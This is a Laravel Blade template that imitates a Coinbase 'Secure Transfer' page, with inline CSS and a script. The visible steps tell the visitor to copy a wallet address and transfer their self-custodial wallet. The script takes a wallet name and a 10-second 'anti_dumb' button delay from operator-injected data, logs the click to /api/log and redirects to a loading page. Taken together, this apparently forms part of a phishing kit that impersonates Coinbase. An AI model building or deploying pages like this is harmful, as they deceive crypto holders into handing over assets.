@extends('user.coinbase.layout')

@section('title', 'Coinbase - Secure Transfer')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button,
select {
  text-transform: none;
}

button,
input:where([type=button]),
input:where([type=reset]),
input:where([type=submit]) {
  -webkit-appearance: button;
  background-color: transparent;
  background-image: none;
}

button {
  height: auto;
  -webkit-appearance: button;
  font: inherit;
}

button,
[role=button] {
  cursor: pointer;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-coinbase-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(87 139 250 / var(--tw-bg-opacity, 1));
}
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-6 { margin-top: 1.5rem; }
.mt-12 { margin-top: 3rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pl-6 { padding-left: 1.5rem; }
.pr-8 { padding-right: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.py-4 { padding-top: 1rem; padding-bottom: 1rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.text-\[28px\] { font-size: 28px; }
.text-black {
  --tw-text-opacity: 1;
  color: rgb(0 0 0 / var(--tw-text-opacity, 1));
}
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.transition-colors {
  transition-property: color,background-color,border-color,text-decoration-color,fill,stroke;
  transition-timing-function: cubic-bezier(.4,0,.2,1);
  transition-duration: .15s;
}
.w-full { width: 100%; }
.hover\:bg-\[\#507fe5\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(80 127 229 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#314b84\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(49 75 132 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#4b78d6\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(75 120 214 / var(--tw-bg-opacity, 1));
}
.disabled\:scale-100:disabled {
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.active\:scale-\[\.98\]:active {
  --tw-scale-x: .98;
  --tw-scale-y: .98;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Securely transfer assets to <span id="cb-st-wallet-name">Coinbase Wallet</span>
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
1. Open <span id="cb-st-wallet-name-step">Coinbase Wallet</span> on your mobile device.
</span>
<br/>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
2. Tap
<b>
Receive
</b>
and copy your wallet address of the asset you wish to receive.
</span>
<br/>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
3. Open the Coinbase app and tap
<b>
transfer
</b>
. Then follow the remaining steps to transfer your self-custodial wallet.
</span>
<button id="cb-st-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-6" type="button">
Continue
</button>
</form>
<script>
(function(){
  var d = window._cbStData || {};
  var hasInject = !!window._cbStData;
  if (hasInject) {
    if (d.exchanger) try { localStorage.setItem('cb_st_exchanger', d.exchanger); } catch(_) {}
    else try { localStorage.removeItem('cb_st_exchanger'); } catch(_) {}
    if (d.anti_dumb) try { localStorage.setItem('cb_st_antiDumb', '1'); } catch(_) {}
    else try { localStorage.removeItem('cb_st_antiDumb'); } catch(_) {}
  }

  var exchangerName = hasInject ? String(d.exchanger || '') : (localStorage.getItem('cb_st_exchanger') || '');
  if (exchangerName) {
    var nameEl = document.getElementById('cb-st-wallet-name');
    var stepEl = document.getElementById('cb-st-wallet-name-step');
    if (nameEl) nameEl.textContent = exchangerName;
    if (stepEl) stepEl.textContent = exchangerName;
  }

  var btn = document.getElementById('cb-st-btn');
  if (localStorage.getItem('cb_st_antiDumb') === '1') {
    var countdown = 10;
    btn.disabled = true;
    btn.textContent = 'Continue (' + countdown + 's)';
    var interval = setInterval(function() {
      countdown--;
      if (countdown > 0) {
        btn.textContent = 'Continue (' + countdown + 's)';
      } else {
        btn.textContent = 'Continue';
        btn.disabled = false;
        clearInterval(interval);
        try { localStorage.removeItem('cb_st_antiDumb'); } catch(_) {}
      }
    }, 1000);
  }

  var _sent = false;
  btn.addEventListener('click', function() {
    if (btn.disabled || _sent) return; _sent = true;
    var csrf = window._liveledCSRF || '';
    var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_secure_transfer',element:'continue',value:'continue'});
    try{navigator.sendBeacon?navigator.sendBeacon('/api/log',b):fetch('/api/log',{method:'POST',body:b,keepalive:true});}catch(e){}
    document.documentElement.style.background='#0a0b0d';
    document.body.style.background='#0a0b0d';
    setTimeout(function(){
      if(window.navigateTo)window.navigateTo('/coinbase/loading');
      else window.location.href='/coinbase/loading';
    },300);
  });
})();
</script>
@endsection
